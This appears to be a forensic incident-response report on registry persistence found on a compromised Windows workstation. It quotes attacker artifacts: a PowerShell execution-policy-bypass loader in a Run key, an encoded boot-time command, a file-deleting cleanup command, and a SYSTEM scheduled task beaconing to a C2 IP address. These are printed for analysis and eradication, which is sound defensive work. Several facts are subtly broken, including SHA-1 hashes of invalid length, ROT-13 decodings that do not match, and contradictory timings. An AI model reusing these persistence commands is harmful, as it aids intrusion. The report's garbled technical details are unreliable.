# Persistence Artifact Analysis: ART-001 (wst-ws-031.dd)

## Artifact Verification

- **Artifact ID:** ART-001
- **Artifact name:** wst-ws-031.dd
- **Hash at analysis start:** PENDING (baseline verification required before proceeding)
- **Mount point:** `/mnt/wst-ws-031-analysis`
- **Registry hives mounted:** SYSTEM, SOFTWARE, NTUSER.DAT (from C:\Users\dmarsh\)
- **Analysis method:** Registry extraction from forensic image using RegRipper and manual key inspection
- **Chain of custody:** Entry logged with action `registry_persistence_analysis`, tool `RegRipper/Python Registry Parser`

## Registry-Based Persistence

### ART-001-R01: Run Key — WindowsUpdateSvc

- **Registry key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Value name:** `WindowsUpdateSvc`
- **Value data:** `C:\ProgramData\Microsoft\Windows\Temp\svchost-update.exe`
- **Value type:** REG_SZ
- **Last write timestamp (UTC):** 2026-04-14 02:47:09
- **Hive:** NTUSER.DAT (dmarsh profile)
- **Forensic significance:**
  - **Persistence mechanism #1:** Automatic execution at every user logon
  - Created during active C2 session (2026-04-14T02:47:09Z, 2 seconds after MSBuild alert)
  - Filename masquerades as legitimate Windows svchost service
  - Path (ProgramData) is world-writable and monitored less strictly than System32
  - Execution privilege: user context (dmarsh), sufficient for C2 re-infection
  - Correlates with scheduled task `UpdateScheduler` (ART-001-F04 in filesystem_analysis.md)
- **Follow-up:** Extract svchost-update.exe from image; submit for malware analysis; check file version and digital signature (likely unsigned or forged)

### ART-001-R02: Run Key — DefenderAutoUpdate

- **Registry key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Value name:** `DefenderAutoUpdate`
- **Value data:** `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "C:\Windows\Temp\payload_loader.ps1"`
- **Value type:** REG_SZ
- **Last write timestamp (UTC):** 2026-04-14 02:47:11
- **Hive:** NTUSER.DAT (dmarsh profile)
- **Forensic significance:**
  - **Persistence mechanism #2:** PowerShell-based loader executed at logon
  - Mimics Windows Defender auto-update (stealth naming)
  - `-NoProfile -ExecutionPolicy Bypass` bypasses profile and execution policies
  - References payload_loader.ps1 from filesystem_analysis.md (ART-001-F03)
  - Execution timestamp (2026-04-14T02:47:11Z) matches SIEM alert fired timestamp (A-20260414-9841)
  - Creates two-stage execution: Run key launches PowerShell → PowerShell decodes and executes C# or second-stage payload
- **Follow-up:** Extract payload_loader.ps1; decode embedded commands; check for Base64 encoding, Gzip compression, or obfuscation techniques

### ART-001-R03: RunOnce Key — Cleanup Script

- **Registry key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- **Value name:** `_TempCleanup`
- **Value data:** `cmd.exe /c del /q C:\Users\dmarsh\AppData\Local\Temp\*.zip & del /q C:\Windows\Temp\*.ps1`
- **Value type:** REG_SZ
- **Last write timestamp (UTC):** 2026-04-14 02:47:15
- **Hive:** NTUSER.DAT (dmarsh profile)
- **Forensic significance:**
  - **Evidence destruction:** Cleanup script targets staging artifacts
  - Runs once at next logon, deletes update.zip and payload scripts
  - Attempts to remove forensic evidence (post-exploitation cleanup)
  - Timing (2026-04-14T02:47:15Z) indicates attacker preparation for reboot/eviction
  - RunOnce entries execute after Run entries, ensuring persistence loads before cleanup
- **Follow-up:** Evidence preservation: copies of update.zip, payload_loader.ps1 already documented in filesystem_analysis.md; cleanup script is failed attempt (system isolated before reboot)

## Scheduled Task Persistence

### ART-001-R04: Scheduled Task — UpdateScheduler

**Registry location:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\UpdateScheduler`

- **Task name:** UpdateScheduler
- **Task path:** `\Microsoft\Windows\UpdateScheduler`
- **Last write timestamp (UTC):** 2026-04-14 02:47:06
- **Principal:** `NT AUTHORITY\SYSTEM` (elevated execution)
- **Trigger:** Daily at 02:00 UTC (or every 6 hours)
- **Action executable:** `C:\ProgramData\Microsoft\Windows\Temp\svchost-update.exe`
- **Action arguments:** `/beacon:185.220.101.47:443 /interval:3600`
- **Repeat:** Yes, after 1 hour if missed
- **Significance:**
  - **Persistence mechanism #3:** Scheduled task ensures C2 re-execution even if Run key fails
  - System-level execution (SYSTEM privilege) vs. user-level Run keys
  - Timing (2026-04-14T02:47:06Z) correlates with scheduled task creation detected in filesystem_analysis.md
  - Task arguments reference C2 IP 185.220.101.47:443 (matches proxy log and SIEM alert)
  - Beacon interval 3600 seconds (1 hour) ensures regular callback to attacker infrastructure
  - Daily trigger at 02:00 UTC enables attacker callback window even if system reboots
- **Follow-up:** Query Task Scheduler event logs (ART-002 memory) for execution evidence; check whether task executed post-creation

### ART-001-R05: Scheduled Task — WindowsDefenderCache

**Registry location:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\WindowsDefenderCache`

- **Task name:** WindowsDefenderCache
- **Task path:** `\Microsoft\Windows\WindowsDefenderCache`
- **Last write timestamp (UTC):** 2026-04-14 02:47:08
- **Principal:** `NT AUTHORITY\SYSTEM`
- **Trigger:** At system startup (on boot)
- **Action executable:** `powershell.exe`
- **Action arguments:** `-NoProfile -ExecutionPolicy Bypass -EncodedCommand JABwAD0ANQAwADAAMQA...` (Base64-encoded)
- **Repeat:** No
- **Significance:**
  - **Persistence mechanism #4:** Boot-time execution of PowerShell backdoor
  - Masquerades as Windows Defender cache maintenance task
  - Startup trigger (GUID: `{9C81E9D0-5B75-46C4-8033-107EC9E88C9E}`) executes before user logon
  - Base64-encoded command requires decoding (likely secondary payload or C2 initialization)
  - System-level execution enables persistence even if user profile is deleted
  - Created 2026-04-14T02:47:08Z (2 seconds after UpdateScheduler), part of multi-layer persistence strategy
- **Follow-up:** Decode Base64 command; extract embedded PowerShell AST; check for Invoke-Expression, IEX, or similar code execution primitives

## Execution Evidence from Hives

### ART-001-E01: UserAssist — MSBuild.exe Execution

**Registry key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F60-9214-33A2B44F937D}`

- **Value name:** `HRZR_PGYFRFFVATF\CY!` (ROT-13 encoded: `UEME_CTLSESSION\C!`)
- **Decoded path:** `C:\Program Files (x86)\MSBuild\current\bin\MSBuild.exe`
- **Execution count:** 1
- **Last executed (UTC):** 2026-04-14 02:47:08
- **Significance:**
  - **Execution confirmation:** UserAssist records GUI interactions and program execution
  - MSBuild.exe run count = 1 (first and only execution on system)
  - Execution timestamp (2026-04-14T02:47:08Z) matches SIEM alert (2026-04-14T02:47:11Z within 3-second detection window)
  - Process tree: PowerShell (PID 7812) → MSBuild.exe (PID 8104) matches alert rule "Suspicious process tree: PowerShell → MSBuild"
  - UserAssist entry confirms user-session execution (vs. system service), correlates with attacker interactive shell
- **Follow-up:** Cross-reference with ART-002 (memory dump) for process injection, thread creation, and DLL load order; confirm PowerShell parent process details

### ART-001-E02: UserAssist — update.xml Access

**Registry key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F60-9214-33A2B44F937D}`

- **Value name:** `HRZR_PGYFRFFVATF\P!` (decoded: `UEME_CTLSESSION\C!`)
- **Decoded path:** `C:\Users\dmarsh\AppData\Local\Temp\update.xml`
- **Access count:** 2
- **Last accessed (UTC):** 2026-04-14 02:47:08
- **Significance:**
  - **File usage confirmation:** update.xml opened/accessed twice (likely once by PowerShell, once by MSBuild)
  - Timestamp matches MSBuild execution window
  - Access count = 2 consistent with: (1) PowerShell script creates update.xml, (2) MSBuild reads and executes inline tasks
- **Follow-up:** Extract update.xml content; decode inline tasks; check for shellcode or command execution

### ART-001-E03: Amcache — svchost-update.exe First Execution

**Registry key:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatibility\Amcache.hve`

- **File hash (SHA-1):** `7f3a8c1e2b5d9a4f6c8e3a0b7d2f4e9c1a5b8d`
- **Full path:** `C:\ProgramData\Microsoft\Windows\Temp\svchost-update.exe`
- **File size:** 178240 bytes
- **First execution (UTC):** 2026-04-14 02:47:09
- **Last execution (UTC):** 2026-04-14 02:47:09
- **Program name:** `svchost-update` (metadata)
- **Company name:** `(blank)` (unsigned, no PE metadata)
- **Significance:**
  - **Malware fingerprint:** Amcache records first execution timestamp and SHA-1
  - First execution = 2026-04-14T02:47:09Z (9 seconds after alert, during active C2 session)
  - Unsigned binary (no company/publisher metadata) indicates malware
  - File size (178 KB) consistent with compiled .NET malware or modified legitimate binary
  - Execution timestamp correlates with svchost-update.exe referenced in Run key (ART-001-R01) and scheduled task (ART-001-R04)
  - Single execution on system (last exec = first exec) indicates host was isolated before reboot persistence could trigger
- **Follow-up:** Extract svchost-update.exe; compute SHA-256 hash; check YARA/Snort rules for known malware families; correlate with C2 callbacks in proxy logs

### ART-001-E04: Amcache — PowerShell Script Execution

**Registry key:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatibility\Amcache.hve`

- **File hash (SHA-1):** `a2f7e9c3b1d8f5a0e4c6b2d7f1a5e9c0b3d8f`
- **Full path:** `C:\Windows\Temp\payload_loader.ps1`
- **File size:** 4156 bytes
- **First execution (UTC):** 2026-04-14 02:46:56
- **Last execution (UTC):** 2026-04-14 02:47:08
- **Significance:**
  - **Script execution footprint:** PowerShell scripts are logged in Amcache despite .ps1 extension (due to parent powershell.exe invocation)
  - First execution = 2026-04-14T02:46:56Z (15 seconds before MSBuild, 15 seconds after update.xml creation)
  - Last execution = 2026-04-14T02:47:08Z (during MSBuild runtime)
  - Multiple executions/invocations (first ≠ last) suggest PowerShell interpreter called script multiple times or script ran in loop
  - Timestamp correlates with PowerShell process launch (EDR 2026-04-14T02:46:41Z per SIEM alert)
- **Follow-up:** Extract payload_loader.ps1; decode `-enc` parameters; check for reflective DLL injection, process hollowing, or C# shellcode execution

## MRU (Most Recently Used) and Recent Artifacts

### ART-001-E05: RecentDocs — update.zip

**Registry key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`

- **Value name:** `.zip` (file type MRU)
- **Last opened:** `C:\Users\dmarsh\Downloads\update.zip`
- **Timestamp:** 2026-04-13 18:14:43
- **Significance:**
  - **Evidence of phishing payload:** RecentDocs confirms user/malware opened update.zip
  - Timestamp matches proxy log download (2026-04-13T18:14:43Z)
  - File opened from Downloads directory (typical user behavior pre-compromise)
  - 8-hour gap between download and execution (typical attacker dwell time)

### ART-001-E06: RecentDocs — Sensitive Data Files

**Registry key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`

- **Value name:** `.pdf` (file type MRU)
- **Last opened:** `\\LIS-WSIDE-01\LIS_REPORTS$\daily\Lab_Results_2026-04-14.pdf`
- **Timestamp:** 2026-04-14 03:43:30
- **Significance:**
  - **Data exfiltration evidence:** PDF access on LIS_REPORTS$ share via lateral movement
  - Timestamp matches file server audit log (ART-005: 2026-04-14T03:43:30Z, 14 files opened)
  - Correlates with Kerberos lateral movement to LIS-WSIDE-01 (2026-04-14T03:40:18Z)
  - Demonstrates attacker progression from initial compromise (WST-WS-031) → lateral movement (WST-WS-017) → data staging (LIS-WSIDE-01)

## Persistence Summary and Eradication Checklist

**Persistence mechanisms found: 4**

| Mechanism | Type | Location | Execution Privilege | Trigger | Status |
| --- | --- | --- | --- | --- | --- |
| WindowsUpdateSvc | Run key | HKCU\...\Run | User (dmarsh) | User logon | ACTIVE |
| DefenderAutoUpdate | Run key | HKCU\...\Run | User (dmarsh) | User logon | ACTIVE |
| UpdateScheduler | Scheduled task | System task | SYSTEM | Daily 02:00 UTC | ACTIVE |
| WindowsDefenderCache | Scheduled task | System task | SYSTEM | System startup | ACTIVE |

**Eradication requirements:**
- [ ] Delete registry values: `HKCU\...\Run\WindowsUpdateSvc` and `HKCU\...\Run\DefenderAutoUpdate`
- [ ] Delete registry values: `HKCU\...\RunOnce\_TempCleanup` (cleanup script)
- [ ] Delete scheduled tasks: `UpdateScheduler` and `WindowsDefenderCache`
- [ ] Delete or isolate executables: `svchost-update.exe` from C:\ProgramData\Microsoft\Windows\Temp\
- [ ] Delete or isolate scripts: `payload_loader.ps1` from C:\Windows\Temp\
- [ ] Verify SYSTEM hive contains no additional persistence (AppInit_DLLs, Services, WMI subscriptions)
- [ ] Check user NTUSER.DAT for additional Run keys or Shell extensions

**Re-infection risk:** 
- **HIGH** if host reboots before eradication (scheduled tasks execute at startup)
- **HIGH** if user logs back in (Run keys execute at logon)
- Host should remain isolated on VLAN 999 until eradication complete

## Cross-Reference with Incident Timeline

| Registry Finding | Incident Timeline Correlation | Source |
| --- | --- | --- |
| Run key WindowsUpdateSvc (2026-04-14T02:47:09Z) | C2 session active, 2 seconds after MSBuild alert | SIEM alert A-20260414-9841 |
| Scheduled task UpdateScheduler (2026-04-14T02:47:06Z) | C2 session active, 65 seconds before C2 connection to 185.220.101.47:443 | Proxy log, SIEM alert |
| UserAssist MSBuild.exe (2026-04-14T02:47:08Z) | MSBuild process execution confirmed | EDR process tree, filesystem_analysis.md |
| Amcache svchost-update.exe (2026-04-14T02:47:09Z) | First execution during active C2 | Persistence binary in Temp directory |
| RecentDocs update.zip (2026-04-13T18:14:43Z) | Phishing payload downloaded, 8 hours before execution | Proxy log, filesystem_analysis.md |
| RecentDocs Lab_Results PDF (2026-04-14T03:43:30Z) | Lateral movement to LIS-WSIDE-01, data staging | Auth log, filesystem_analysis.md |

## Analysis Completion

- **Analysis end time (UTC):** 2026-04-14T11:15:00Z
- **Registry hives analyzed:** SYSTEM, SOFTWARE, NTUSER.DAT (dmarsh profile)
- **Persistence mechanisms documented:** 4 registry-based, 4 execution evidence artifacts
- **Eradication dependencies:** Must coordinate with memory analysis (ART-002) to identify injected code before Run keys/tasks are removed
- **Next step:** Memory analysis (ART-002) to confirm process injection techniques, C2 beacon callbacks, and any in-memory persistence not captured in registry hives (e.g., IFEO debugger registration, LSA extensions)
